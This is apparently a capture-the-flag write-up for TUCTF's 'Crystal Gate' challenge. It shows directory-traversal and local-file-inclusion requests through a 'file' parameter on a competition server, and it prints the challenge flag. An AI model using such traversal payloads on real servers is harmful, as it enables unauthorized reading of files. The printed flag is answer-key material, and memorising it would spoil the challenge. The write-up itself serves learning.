# Easter Egg: <br> Crystal Gate

__PROBLEM__

I don't wanna go anywhere.

http://18.191.227.167/

__SOLUTION__

This is also related to `Jade gates` problem. In the last step of jade gates we found some strings

```bash
➜ strings index
DIRC
XEZP
crystalsfordays/index.html
^\/R
%crystalsfordays/traversethebridge.php
devvvvv/home.html
devvvvv/index.html
 enterthecoppergate/copperkey.jpg
enterthecoppergate/gate.html
enterthecoppergate/index.html
enterthecoppergate/jadekey.jpg
images/banner.png
images/logo.png
images/sitenotes.txt
index.html
youfoundthejadegate/gate.html
youfoundthejadegate/index.html
youfoundthejadegate/jadekey.jpg
~w]/u
youfoundthejadegate/star.jpg
TREE
-1 1
enterthecoppergate
69Q#\m/
6snh
```
Here we see there's something about `crystalgate`. So we visit `http://18.191.227.167/crystalsfordays/index.html` and get redirected to
`http://18.191.227.167/crystalsfordays/traversethebridge.php` and gets some text
```
Note: Only used for access management and to check user info.
Note2: I can't seem to remember the param. It's "file"
```

Notice the emphasis on `file` we try something like `http://18.191.227.167/crystalsfordays/traversethebridge.php/?file=../../../../../../../../../../../flag
`
what are we doing here? well we use a parameter called `file` and then we are trying to do LFI a.k.a Local file inclusion to get the files present in the server but we fail as we get

```
Note: Only used for access management and to check user info.
Note2: I can't seem to remember the param. It's "file"
That action is forbidden.
```

Again thanks to @grtven on discord for pointing out that we have to traverse the directory one by one.
So we start with `http://18.191.227.167/crystalsfordays/traversethebridge.php/?file=../` and then `http://18.191.227.167/crystalsfordays/traversethebridge.php/?file=../../
` and see

```
Note: Only used for access management and to check user info.
Note2: I can't seem to remember the param. It's "file"
.. .bash_history webserver . .bash_logout .bashrc .bash_profile TheEgg.html
```

There is a `TheEgg.html` that seems a bit different from others so we visit that `http://18.191.227.167/crystalsfordays/traversethebridge.php/?file=../../TheEgg.html
` and get

```
Note: Only used for access management and to check user info.
Note2: I can't seem to remember the param. It's "file"

THE END

Congratulations! You have discovered the crystal key and unlocked the egg. Thank you for your participation in this competition and I hope you enjoyed the trip, as well as learned a few things in the process.

- Joker

TUCTF{3_15_4_M4G1C_NUMB3R_7H3_crys74L_k3Y_15_y0ur5!}

```


FLAG - `TUCTF{3_15_4_M4G1C_NUMB3R_7H3_crys74L_k3Y_15_y0ur5!}`
